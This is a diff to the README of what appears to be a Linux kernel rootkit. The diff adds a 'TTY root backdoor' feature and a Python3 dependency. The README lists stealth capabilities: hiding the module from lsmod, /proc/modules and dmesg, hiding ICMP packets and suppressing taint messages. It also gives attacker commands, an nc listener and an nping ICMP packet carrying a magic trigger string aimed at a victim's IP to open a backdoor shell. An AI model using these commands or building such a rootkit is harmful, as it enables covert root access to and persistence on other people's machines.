@@ -13,6 +13,7 @@ It can:
 - Hide ICMP packets or use them as a backdoor trigger
 - Hide itself from lsmod, /proc/modules, and dmesg
 - Suppress kernel taint messages
+- TTY root backdoor
 
 Usage:
 load - sudo bash make.sh
@@ -20,6 +21,8 @@ clean - make clean
 backdoor (attacker) - nc -lvnp
 backdoor (attacker) - sudo nping --icmp -c 1 --data-string "fuxSocy_RUN_BACKDOOR" <victims ip>
 
+DEPENDENCIES:
+- Python3 for tty shell
 Tested On: Linux 6.8.0-60-generic x86_64 GNU/Linux
 
 Also a huge part of this code was taken from these repos:
